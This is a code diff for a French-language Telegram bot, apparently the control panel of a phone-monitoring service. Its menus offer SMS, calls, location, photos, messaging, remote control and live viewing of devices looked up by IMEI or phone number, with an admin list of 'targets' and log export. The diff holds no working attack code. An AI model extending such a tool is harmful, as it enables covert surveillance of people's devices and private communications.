@@ -1,7 +1,7 @@
-# main.py (version corrigée avec menu permanent)
+# main.py
 import os
 import logging
-from datetime import datetime
+import re
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
@@ -148,17 +148,8 @@ def get_persistent_keyboard():
         ["📁 Fichiers", "📋 Admin", "🔄 Actualiser"]
     ]
 
-def get_main_category_keyboard():
-    """Clavier principal avec catégories"""
-    return [
-        ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
-        ["🖼️ Photos & Vidéos", "💬 Messagerie instantanée", "🎙️ Contrôle à distance"],
-        ["📺 Visualisation en direct", "📁 Gestionnaire de fichiers", "⏱ Restriction d'horaire"],
-        ["📱 Applications", "🌐 Sites Web", "📅 Calendrier"],
-        ["👤 Contacts", "📊 Outils d'analyse", "🔍 Changer d'appareil"]
-    ]
-
 def get_admin_keyboard():
+    """Clavier pour le panel admin"""
     return [
         ["📋 Liste des cibles", "🗑️ Supprimer une cible"],
         ["📈 Statistiques", "📤 Exporter les logs"],
@@ -184,7 +175,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
     
     await update.message.reply_text(
-        "🔍 Entrez un IMEI, numéro de série ou numéro de téléphone...",
+        "🔍 Entrez un IMEI, numéro de série ou numéro de téléphone (ex: 123456789012345, SN12345, +33612345678)...",
         reply_markup=reply_markup
     )
     return MAIN_MENU
@@ -207,7 +198,10 @@ async def handle_device_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return CATEGORY_SELECTION
         else:
             await update.message.reply_text(
-                "❌ Format invalide. Veuillez réessayer.",
+                "❌ Format invalide. Formats acceptés :\n"
+                "- IMEI : 15 chiffres\n"
+                "- Numéro de série : alphanumérique\n"
+                "- Numéro international : +33612345678",
                 reply_markup=reply_markup
             )
             return MAIN_MENU
@@ -244,7 +238,6 @@ async def handle_category_selection(update: Update, context: ContextTypes.DEFAUL
         
         # Vérifier si la catégorie existe dans la structure
         if category in MENU_STRUCTURE:
-            # Stocker la catégorie principale
             context.user_data['current_main_category'] = category
             main_category = MENU_STRUCTURE[category]
             
@@ -358,7 +351,7 @@ async def handle_subcategory_selection(update: Update, context: ContextTypes.DEF
         return await return_to_categories(update, context)
 
 async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Gère les opérations sur les fichiers avec menu permanent"""
+    """Gère les opérations sur les fichiers"""
     try:
         user_choice = update.message.text
         device_id = context.user_data.get('current_device')
@@ -425,7 +418,7 @@ async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TY
         return await return_to_categories(update, context)
 
 async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Gère le téléchargement de fichiers avec menu permanent"""
+    """Gère le téléchargement de fichiers"""
     try:
         device_id = context.user_data.get('current_device')
         category_path = context.user_data.get('current_category')
@@ -454,7 +447,7 @@ async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE)
             return await return_to_categories(update, context)
         
         await update.message.reply_text(
-            "❌ Format de fichier non reconnu.",
+            "❌ Format de fichier non reconnu. Veuillez envoyer un document.",
             reply_markup=reply_markup
         )
         return FILE_OPERATION
@@ -590,7 +583,7 @@ async def export_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return CATEGORY_SELECTION
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Annule la conversation et réinitialise complètement"""
+    """Annule la conversation et réinitialise"""
     context.user_data.clear()
     keyboard = get_persistent_keyboard()
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
@@ -602,11 +595,11 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Commande de réinitialisation explicite"""
+    """Commande de réinitialisation"""
     return await start(update, context)
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    """Gère les erreurs de manière robuste"""
+    """Gère les erreurs"""
     logger.error("Exception lors de la mise à jour du bot:", exc_info=context.error)
     
     if update and isinstance(update, Update):
@@ -616,8 +609,7 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
             
             await update.message.reply_text(
                 "❌ Une erreur critique s'est produite. "
-                "Veuillez utiliser /start pour réinitialiser le bot.\n\n"
-                f"Erreur: {str(context.error)[:200]}",
+                "Veuillez utiliser /start pour réinitialiser le bot.",
                 reply_markup=reply_markup
             )
         except:
@@ -626,7 +618,7 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 def run_bot():
-    """Démarre le bot avec menu permanent"""
+    """Démarre le bot"""
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     
     # Commandes de base
@@ -666,7 +658,7 @@ def run_bot():
     application.add_error_handler(error_handler)
     
     # Démarrer le bot
-    logger.info("Bot démarré avec succès!")
+    logger.info("Bot MDM démarré avec succès!")
     application.run_polling()
 
 if __name__ == '__main__':
